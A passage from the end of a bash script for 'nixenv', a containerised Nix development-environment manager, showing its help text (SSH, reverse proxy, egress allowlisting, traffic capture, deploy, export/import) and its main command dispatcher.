  shell <project>           Interactive zsh via the engine's 'exec' (no SSH key)
  expose <project> <port>…  Publish extra port(s) (e.g. 8080 or 3000:3000),
                            stored in <project>/ports; restarts to apply
  host <project> <name:ip>… Append /etc/hosts entries (e.g. db:10.0.0.5) to
                            <project>/hosts.extra; the entrypoint merges that file
                            into /etc/hosts at start. Edit the file by hand too.
                            Restarts a running project to apply
  proxy [up|reload|stop|status|logs [egress]|renew|remove-cert]
                            Shared Caddy reverse proxy (plus, for restricted
                            projects, the '$EGRESS_NAME' container running squid). 'up' starts it and routes
                            https://<project>-<port>.$PROXY_DOMAIN → nixenv-<project>:<port>
                            over network '$PROXY_NET' (projects auto-join on 'run').
                            Auto-starts on the first 'run' (PROXY_AUTOSTART=0 to skip).
                            Uses a trusted mkcert wildcard if mkcert is installed
                            (explains before 'mkcert -install'; PROXY_MKCERT_INSTALL=0
                            to skip trusting), else Caddy's internal CA.
                            'renew' reissues the cert; 'remove-cert' deletes it
                            (falls back to the internal CA). 'reload' applies
                            routing/allowlist changes without restarting it.
                            A restricted project may only reach its OWN URLs through
                            the proxy; list other projects in <target>/accept-from
                            ('*' = all), then 'proxy reload'
  restrict <project> [on|off]
                            Egress restriction — ON BY DEFAULT for every project:
                            it runs on its own INTERNAL network (no route out) and
                            can only reach hosts in <project>/allowed_hosts (the
                            forge domain is seeded automatically), via squid in
                            the '$EGRESS_NAME' container (default-deny). ssh/ports keep
                            working (relayed through the proxy). 'off' opts out
  allow <project> <host>…   Add validated egress host(s) (domain or IP) to
                            <project>/allowed_hosts and reload the proxy
  egress <project> [-f]     Show the project's egress log: allowed vs DENIED
                            domains (candidates to validate); -f follows live
  capture <project> [on [egress|ingress]|off|untrust|status|web|log [-f]|tui|har <file>|clear]
                            Record a RESTRICTED project's HTTP(S) traffic with
                            mitmproxy, behind squid (its rules still apply).
                            'egress' = its outbound requests (HTTPS decrypted: the
                            container trusts mitmproxy's CA — restart it after
                            the FIRST 'on'; the trust is then kept across 'off'
                            until 'untrust'); 'ingress' = requests to its
                            public URLs (via Caddy). Default: both.
                            'web' prints the mitmweb UI URL (<project>-mitm.$PROXY_DOMAIN),
                            'log -f' follows a one-line-per-request log, 'tui'
                            opens the recorded flows in mitmproxy's console UI,
                            'har' exports them. Captures hold tokens and cookies:
                            they stay owner-only in $EGRESS_DATA_DIR/captures
  deploy <project> [--agent=<socket>|--no-agent] [-- <command>…]
                            Open a shell in a THROWAWAY deploy container with
                            your ssh agent forwarded (never into the dev
                            container). Code = the app volume (shared, rw); git
                            identity + https credentials from the home seed;
                            same tools as the dev container; tmpfs home;
                            removed on exit. Egress: the
                            project's allowed_hosts + <project>/deploy_hosts.
                            Host files: deploy_ssh_config, deploy_gitconfig,
                            deploy_known_hosts.
  deploy <project> allow <host>… | hosts | log [-f] | stop
                            Add deploy-only hosts / show what deploy can reach /
                            its egress log / remove a leftover deploy container
  ssh-config [--install]    Print (or install) the ~/.ssh/config Include so
                            'ssh <project>' works via each <project>/ssh/config
  up <project>              build if needed, then start the service
  stop [<project>]          Stop & remove the project's service container.
                            With NO project: stops every nixenv container,
                            including the shared proxy (volumes are untouched)
  logs <project>            Follow the service container logs
  delete <project>          Permanently remove a project (container; app, home and
                            databases volumes; host dir) — prints the commands and
                            asks to confirm
  export <project> [file] [--with-home] [--force]
                            Archive the project (app + databases volumes and
                            its whole project dir except per-machine state) into
                            one .tar for another machine or a backup. Refuses
                            while it is running (--force snapshots live).
                            --with-home also archives the home volume and the
                            seed's git credentials — that archive is a SECRET.
  import <file> [new-name] [--force] [--yes]
                            Recreate a project from such an archive: restores the
                            volumes and settings (re-validated; engine
                            parameters, deploy configs and extra ssh keys only
                            after you confirm), chowns to YOUR uid, regenerates
                            passwd/shadow, ssh keys and a fresh SSH port, and
                            (without a home) seeds dotfiles, asking for a git
                            identity only if none came across.
  sync-home <project>       Refresh home dotfiles into the existing home volume:
                            embedded templates first, then per-project overrides
                            from <repo>/.nixenv/home/; backs up overwritten files,
                            keeps plugins/history/creds
  projects                  List projects with their SSH port and state
  update                    Refresh flake.lock, then rebuild into the volume
  github-token [--clear|--status]
                            Store a GitHub token (asked once on the first build).
                            Optional: lifts GitHub's anonymous API limit of 60
                            requests/hour per IP — often hit behind a shared
                            office/VPN address. Stored in ~/.nixenv/github_token
  status                    Show context + volume + shared-profile state
  gc [--dry-run]            Garbage-collect the store: delete old generations and
                            every path no live profile needs — reclaims the space
                            left by packages removed from a flake. Prints the
                            before/after size; --dry-run only reports
  clean                     Delete the standalone volume (removes shared packages)
  install                   Copy this script onto your PATH (as '${INSTALL_NAME:-nixenv}')
  uninstall                 Remove the installed copy
  --version                 Print the version and exit

Per-project (runtime runs as non-root user '$APP_USER'):
  volume <project>_home → /home/$APP_USER  (seeded from <project>/home)
  volume <project>_app  → /app (or <project>/app_mount) — your code; WORKDIR
  <project>/home        → host seed for the home volume (.ssh, .zshrc, configs)
  <project>/app_mount   → custom container path for the code volume (opt; --app-path)
  <project>/port        → the project's stable random host SSH port
  <project>/ports       → extra published ports (one per line; via 'expose')
  <project>/hosts.extra → extra /etc/hosts lines (native "ip name" format), merged
                          into /etc/hosts at container start (edit by hand or 'host')
  <project>/unrestricted → opt-OUT marker: egress restriction disabled for this
                          project ('restrict <p> off'; absent = restricted)
  <project>/allowed_hosts → validated egress hosts, one per line (via 'allow';
                          init seeds the forge domain from the clone URL)
  <project>/capture     → 'capture' on: the directions recorded (egress/ingress)

SSH: each project gets a random host port (stored once in <project>/port). The
container runs an unprivileged sshd (port 2222) via runit as '$APP_USER', key-only:
nixenv generates a per-project key in <project>/ssh/ and nothing else is accepted
(add your own keys to <project>/ssh/authorized_keys.extra). Use 'ssh-config
--install' + 'ssh <project>' for the zmx workflow.

Environment overrides:
  CONTAINER_ENGINE=${CONTAINER_ENGINE:-auto}   (docker|podman; auto-detects, asks if both)
  CONTEXT_DIR=$CONTEXT_DIR
  NIX_VOLUME=$NIX_VOLUME
  BUILDER_IMAGE=$BUILDER_IMAGE
  RUNTIME_IMAGE=$RUNTIME_IMAGE
  FLAKE_DIR=$FLAKE_DIR
  FLAKE_REF=$FLAKE_REF
  PROFILE=$PROFILE
  APP_USER=$APP_USER
  INSTALL_DIR=${INSTALL_DIR:-/usr/local/bin}   (install/uninstall target dir)
  INSTALL_NAME=${INSTALL_NAME:-nixenv}         (installed command name)
  PROXY_DOMAIN=$PROXY_DOMAIN            (base domain for the proxy)
  PROXY_NET=$PROXY_NET                  (shared user network)
  PROXY_HTTP_PORT=$PROXY_HTTP_PORT / PROXY_HTTPS_PORT=$PROXY_HTTPS_PORT   (host ports; use 8080/8443 for podman rootless)
  PROXY_AUTOSTART=$PROXY_AUTOSTART                     (auto-start the proxy on 'run'; 0 to disable)
  PROXY_MKCERT_INSTALL                        (1=run 'mkcert -install' on explicit 'proxy up';
                                               0=never trust — HTTPS works with a warning.
                                               Auto-start on 'run' defaults to 0)
  TEMPLATE_BASE=$TEMPLATE_BASE
                                              (where 'init --template=<name>' resolves short names)

Projects always live in $PROJECTS_DIR.

Examples:
  $0 build                                  # populate the volume once
  $0 init myapp                             # scaffold + prompt for git identity
  $0 init myapp git@github.com:me/app.git   # also clone into the app volume
  $0 init web git@github.com:me/web.git --app-path=/var/www/html   # custom mount
  $0 init myblog --template=wordpress       # ready-to-run WordPress stack
  $0 init myworker --template=cloudflare    # Cloudflare Workers + wrangler
  $0 run myapp                              # start the service (prints SSH port)
  $0 ssh myapp                              # SSH in as 'app'
  $0 shell myapp                            # interactive zsh via engine exec
  $0 proxy up                               # start the shared reverse proxy
  # then browse https://myapp-3000.$PROXY_DOMAIN/  (app listening on :3000)
  $0 stop myapp                             # stop the service

Skip the git prompt by exporting GIT_USER_NAME / GIT_USER_EMAIL before init.
EOF
}

main() {
  local cmd="${1:-}"; shift || true
  case "$cmd" in
    ""|-h|--help|help) usage; return 0;;
    # Before materialize_context on purpose: `--version` must work with no
    # engine, no network and no writes — it's what `brew test` runs.
    -v|--version|version) printf 'nixenv %s\n' "$NIXENV_VERSION"; return 0;;
    install)   cmd_install "$@"; return $?;;
    uninstall) cmd_uninstall "$@"; return $?;;
  esac

  # Always (re)materialise the embedded context first, then run from it.
  materialize_context

  case "$cmd" in
    build)    cmd_build "$@";;
    init)     cmd_init "$@";;
    run|start) cmd_run "$@";;
    up)       cmd_up "$@";;
    shell)    cmd_shell "$@";;
    ssh)      cmd_ssh "$@";;
    ssh-config) cmd_ssh_config "$@";;
    expose)   cmd_expose "$@";;
    host)     cmd_host "$@";;
    proxy)    cmd_proxy "$@";;
    restrict) cmd_restrict "$@";;
    allow)    cmd_allow "$@";;
    egress)   cmd_egress "$@";;
    capture)  cmd_capture "$@";;
    deploy)   cmd_deploy "$@";;
    stop)     cmd_stop "$@";;
    logs)     cmd_logs "$@";;
    delete|rm) cmd_delete "$@";;
    sync-home) cmd_sync_home "$@";;
    export)   cmd_export "$@";;
    import)   cmd_import "$@";;
    projects) cmd_projects "$@";;
    update)   cmd_update "$@";;
    github-token) cmd_github_token "$@";;
    status)   cmd_status "$@";;
    gc)       cmd_gc "$@";;
    clean)    cmd_clean "$@";;
    *) die "unknown command: $cmd (try '$0 --help')";;
  esac
}

# Run only when EXECUTED. When sourced (the test suite does this to unit-test
# the functions), define everything but perform no action.
if [ "${BASH_SOURCE[0]}" = "$0" ]; then
  main "$@"
fi
